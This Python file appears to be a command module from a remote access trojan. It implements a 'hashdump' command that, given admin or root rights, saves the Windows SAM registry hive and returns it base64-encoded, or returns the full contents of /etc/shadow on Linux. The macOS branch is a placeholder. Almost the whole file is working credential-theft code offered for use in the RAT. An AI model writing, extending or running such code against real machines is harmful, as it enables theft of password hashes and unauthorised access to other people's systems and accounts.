import platform
import subprocess
import base64
import tempfile
import os
from pathlib import Path
from rat.commands.base_command import BaseCommand

class HashdumpCommand(BaseCommand):
    name = "hashdump"
    description = "Retrieve password hashes (requires admin/root)"

    def execute(self, args: str) -> str:
        system = platform.system()
        try:
            if system == "Windows":
                return self._windows_dump()
            elif system == "Linux":
                return self._linux_dump()
            elif system == "Darwin":
                return self._macos_dump()
            else:
                return f"Unsupported OS: {system}"
        except Exception as e:
            return f"hashdump error: {e}"

    # -----------------------------------------------------------------
    # Windows – uses reg save, no hang, base64 encoded hives
    # -----------------------------------------------------------------
    def _windows_dump(self):
        import ctypes, subprocess, base64
        from pathlib import Path

        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator privileges required."

        sam_file = "C:\\Windows\\Temp\\sam_dump"
        Path(sam_file).unlink(missing_ok=True)

        result = subprocess.run(
            ["reg", "save", "HKLM\\SAM", sam_file, "/y"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            return f"reg save failed: {result.stderr.strip()}"

        data = Path(sam_file).read_bytes()
        sam_b64 = base64.b64encode(data).decode()
        return f"Windows SAM hive (base64):\n{sam_b64}"

    # -----------------------------------------------------------------
    # Linux – reads /etc/shadow (needs root)
    # -----------------------------------------------------------------
    def _linux_dump(self):
        shadow = Path("/etc/shadow")
        if not shadow.exists():
            return "Error: /etc/shadow not found"

        if os.geteuid() != 0:
            return "Root privileges required. Run the client with sudo."

        try:
            # Return the complete file – no filtering, no base64
            return shadow.read_text()
        except PermissionError:
            return "Error: cannot read /etc/shadow – permission denied"
        except Exception as e:
            return f"Linux dump error: {e}"
    # -----------------------------------------------------------------
    # macOS – placeholder
    # -----------------------------------------------------------------
    def _macos_dump(self):
        return "macOS hashdump not yet implemented"
